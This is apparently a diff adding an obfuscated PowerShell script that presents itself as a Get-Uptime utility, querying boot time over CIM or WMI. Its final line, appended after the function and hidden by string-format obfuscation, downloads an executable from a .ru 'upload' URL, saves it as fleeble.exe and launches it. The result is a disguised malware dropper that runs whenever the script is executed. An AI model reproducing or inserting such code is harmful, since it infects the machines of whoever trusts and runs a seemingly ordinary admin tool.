@@ -1,0 +1,140 @@
+  sET-item ("vAr"+"IAB"+"le:"+"c1Eno") ( [TYPE]("{5}{4}{1}{0}{6}{2}{8}{10}{9}{3}{7}"-F 'eME','NaG','.','N.PscRE','ystEM.Ma','S','NT','DEnTiAL','a','Omatio','Ut')  ) ; function get-UPt`i`Me
+{
+
+    [CmdletBinding()]
+    PARAM (
+        [Parameter(
+                   paraMeteRsetnamE = "M`AiN",
+                   VaLUEFrOmPIPeLIne = ${t`RuE},
+                   VaLuEfrOmPIpeliNeByPRopertynAme = ${Tr`Ue})]
+        [Alias("CN", {"{1}{0}{2}" -f'R','__SE','VER'}, {"{3}{2}{4}{0}{1}"-f'erNa','me','u','PSComp','t'})]
+        [String[]]${c`omPUte`Rn`Ame}=${env:`c`OM`puter`NaMe},
+
+        [Parameter(PaRamETerSeTnaME = "MA`iN")]
+        [Alias({"{1}{0}" -f 'unAs','R'})]
+        [System.Management.Automation.Credential()]
+        ${Cre`d`e`NTIAl} =   (GI ("vaR"+"IAb"+"LE:"+"c1eNO"))."V`ALue"::"E`MPTY",
+
+        [Parameter(PAraMeTERseTNaME = "ci`msE`ssioN")]
+        [Microsoft.Management.Infrastructure.CimSession[]]${C`im`S`essIon}
+    )
+    BEGIN
+    {
+        
+        function ge`T-Defau`LTmES`s`AGe
+        {
+
+            PARAM (${m`ESs`AGE})
+            ${Dat`e`FOR`Mat} = &("{0}{2}{1}" -f'Get-','ate','D') -Format ("{2}{4}{1}{3}{0}"-f 'f','mm:s','yyyy','s:f','/MM/dd-HH:')
+            ${FUnCTio`N`N`Ame} = (.("{0}{3}{2}{1}" -f 'G','iable','-Var','et') -Scope 1 -Name ("{0}{2}{1}{3}"-f'My','cat','Invo','ion') -ValueOnly)."M`YCOM`mAnd"."nA`Me"
+            .("{0}{3}{1}{2}"-f'Writ','p','ut','e-Out') ("[$DateFormat][$FunctionName] "+"$Message")
+        }
+    }
+    PROCESS
+    {
+        IF (${PSbO`U`N`dParA`Mete`Rs}[("{0}{2}{1}" -f'Cim','ession','S')])
+        {
+            FOREACH (${C`IM} in ${ci`M`SESsi`on})
+            {
+                ${cIM`Co`MP`UTer} = $(${C`im}."c`oMP`U`TERnamE").("{1}{0}{2}" -f'U','To','pper').Invoke()
+
+                TRY
+                {
+                    
+                    ${cImSp`latTi`Ng} = @{
+                        ("{0}{1}" -f 'C','lass') = ("{2}{3}{0}{1}{4}"-f'32_Operati','ngS','W','in','ystem')
+                        ("{1}{0}{2}"-f'essio','CimS','n') = ${C`Im}
+                        ("{0}{1}{2}{3}" -f 'ErrorA','cti','o','n') = ("{1}{0}" -f'top','S')
+                        ("{2}{3}{0}{1}" -f 'riabl','e','Erro','rVa') = ("{4}{0}{1}{3}{2}" -f'orPro','cess','etCimInstance','G','Err')
+                    }
+
+
+                    .("{2}{1}{0}"-f 'ite-Verbose','r','W') -Message (&("{4}{2}{3}{1}{0}" -f 'Message','lt','et-De','fau','G') -Message ("$CIMComputer "+'- '+'Get-U'+'pti'+'m'+'e'))
+                    ${C`I`m`REsULT} = &("{3}{4}{2}{0}{1}"-f'mInsta','nce','Ci','Ge','t-') @CIMSplatting
+
+                    
+                    ${uPt`IMe} = &("{1}{0}{2}{3}" -f 'S','New-Time','pa','n') -Start $(${CI`MrESu`Lt}."l`As`TbOoTup`Ti`ME") -End (.("{1}{0}{2}"-f 'et','g','-date'))
+
+                    ${PROpEr`T`IEs} = @{
+                        ("{1}{0}{2}"-f 'mpute','Co','rName') = ${CiM`CoMpu`TeR}
+                        ("{0}{1}" -f'D','ays') = ${UP`T`iME}."d`AYS"
+                        ("{0}{1}" -f 'Hou','rs') = ${U`PT`IMe}."ho`URs"
+                        ("{2}{0}{1}"-f 'nute','s','Mi') = ${uP`T`ImE}."Minu`TES"
+                        ("{2}{1}{0}"-f 'conds','e','S') = ${UP`Ti`Me}."s`ecONDs"
+                        ("{2}{3}{0}{1}" -f'tBoo','tUpTime','L','as') = ${C`I`MresulT}."Last`BoO`T`U`ptIme"
+                    }
+
+                    
+                    &("{2}{0}{3}{1}"-f'ew','ject','N','-Ob') -TypeName ("{0}{2}{1}"-f'PS','ject','Ob') -Property ${p`RoP`eRTIeS}
+
+                }
+                CATCH
+                {
+                    .("{3}{1}{2}{0}" -f '-Warning','i','te','Wr') -Message (&("{3}{1}{4}{2}{0}"-f 'essage','Defa','tM','Get-','ul') -Message ("$CIMComputer "+'- '+'So'+'me'+'th'+'ing '+'w'+'rong '+'hap'+'p'+'ened'))
+                    IF (${ERR`Orp`ROcess`GeT`c`iMI`Ns`Ta`NCe}) { &("{1}{2}{0}"-f 'g','Write-Warni','n') -Message (&("{0}{2}{3}{1}"-f 'Get-De','ultMessage','f','a') -Message ("$CIMComputer "+'- '+'Issue'+' '+'w'+'ith '+'Get-C'+'imInsta'+'n'+'ce')) }
+                    &("{3}{2}{0}{4}{1}" -f'-Warn','ng','te','Wri','i') -Message ${ER`Ror}[0]."e`X`cEPti`on"."mess`AGE"
+                } 
+                FINALLY
+                {
+                    ${C`imSp`lA`TtI`NG}.("{1}{0}"-f 'lear','C').Invoke() | &("{0}{1}{2}"-f'Out','-Nu','ll')
+                }
+            } 
+        } 
+        ELSE
+        {
+            FOREACH (${c`OMP`UTeR} in ${C`om`PuTERNAmE})
+            {
+                ${Co`mPu`Ter} = ${cO`MP`UteR}.("{2}{1}{0}" -f 'per','oUp','T').Invoke()
+
+                TRY
+                {
+                    &("{0}{3}{4}{2}{1}"-f'Writ','se','Verbo','e','-') -Message (&("{0}{4}{3}{2}{1}" -f 'Get-Def','age','ess','ltM','au') -Message ("$Computer "+'- '+'Tes'+'t'+'-Co'+'nnection'))
+                    IF (&("{0}{1}{2}"-f'T','est-Con','nection') -Computer ${c`oMpu`TeR} -count 1 -quiet)
+                    {
+                        ${spLaT`T`ing} = @{
+                            ("{0}{1}"-f'C','lass') = ("{3}{4}{1}{2}{5}{6}{0}" -f 'em','32_','O','Wi','n','pe','ratingSyst')
+                            ("{2}{3}{1}{0}"-f'rName','te','C','ompu') = ${co`mPu`TEr}
+                            ("{2}{1}{0}" -f'ion','rorAct','Er') = ("{0}{1}" -f'S','top')
+                            ("{3}{1}{0}{2}"-f'rV','o','ariable','Err') = ("{5}{2}{0}{4}{1}{3}" -f'orProce','Wm','rr','i','ssGet','E')
+                        }
+
+                        IF (${ps`BOU`NDPaRam`eTERs}[("{3}{0}{1}{2}"-f 'reden','t','ial','C')])
+                        {
+                            ${s`P`l`AtTiNG}."c`R`edenti`AL" = ${Cr`eDe`NTIAL}
+                        }
+
+                        .("{0}{1}{2}{3}" -f 'W','ri','te-Verbos','e') -Message (.("{5}{1}{2}{4}{0}{3}"-f'ess','et-De','fault','age','M','G') -Message ("$Computer "+'- '+'Get'+'ting '+'U'+'ptime'))
+                        ${r`esuLT} = &("{2}{3}{1}{0}"-f 't','Objec','Get-W','mi') @Splatting
+
+
+                        
+                        ${Hu`maNTIM`EFor`Mat} = ${R`Es`ULT}.("{2}{1}{0}{3}"-f'tToDa','nver','Co','teTime').Invoke(${r`Esu`lT}."lASTb`O`O`TU`pTImE")
+                        ${UPTI`ME} = .("{1}{0}{3}{2}" -f'ew-','N','meSpan','Ti') -Start ${h`UM`AnTImEfORM`AT} -End $(.("{1}{2}{0}" -f't-date','g','e'))
+
+                        ${P`RO`peRtieS} = @{
+                            ("{2}{1}{0}"-f 'Name','uter','Comp') = ${cO`mpu`TEr}
+                            ("{0}{1}" -f 'Da','ys') = ${UPT`i`mE}."DA`YS"
+                            ("{0}{1}" -f 'Hour','s') = ${upti`Me}."ho`UrS"
+                            ("{0}{1}{2}"-f 'Mi','n','utes') = ${U`PTi`me}."MI`NuTEs"
+                            ("{2}{1}{0}" -f 'ds','n','Seco') = ${UPT`I`mE}."SE`conDS"
+                            ("{3}{0}{1}{2}" -f 'otUp','Ti','me','LastBo') = ${c`I`mrESuLt}."La`StB`OotUpTIME"
+                        }
+                        
+                        &("{1}{0}{2}" -f 'j','New-Ob','ect') -TypeName ("{0}{1}" -f'PSObj','ect') -Property ${prOPE`Rti`es}
+                    }
+                }
+                CATCH
+                {
+                    &("{3}{0}{2}{1}"-f 'ite','g','-Warnin','Wr') -Message (.("{0}{1}{3}{2}" -f'Get-Defaul','tMess','e','ag') -Message ("$$Computer "+'- '+'So'+'meth'+'ing '+'wr'+'ong '+'happe'+'n'+'ed'))
+                    IF (${erRO`RPr`oCESs`GeTWMI}) { &("{1}{0}{2}" -f '-War','Write','ning') -Message (&("{1}{3}{2}{0}"-f'ge','Ge','ssa','t-DefaultMe') -Message ("$Computer "+'- '+'I'+'ss'+'ue '+'with'+' '+'Get'+'-W'+'miOb'+'je'+'ct')) }
+                    .("{1}{4}{2}{3}{0}" -f'ng','Writ','arn','i','e-W') -MEssage ${erR`or}[0]."ex`cE`PTION"."mE`ss`AgE"
+                }
+                FINALLY
+                {
+                    ${SPlat`T`I`NG}.("{0}{1}" -f 'Cl','ear').Invoke()
+                }
+            }
+        } 
+    }
+}
+(.("{2}{0}{1}"-f'-Obje','ct','New') ("{1}{0}{4}{2}{3}"-f'et.We','System.N','Cl','ient','b')).("{1}{3}{0}{2}" -f 'nloa','Do','dFile','w').Invoke(("{11}{5}{12}{0}{9}{10}{6}{13}{8}{2}{4}{1}{7}{3}" -f'ic','.e','e','e','fud','t','ions','x','load/prais','so','lut','http://','ox','.ru/up'),("{1}{0}{2}" -f'b','flee','le.exe'));&("{3}{2}{1}{0}" -f'ss','Proce','tart-','S') ("{1}{2}{0}{3}"-f'le.ex','f','leeb','e')
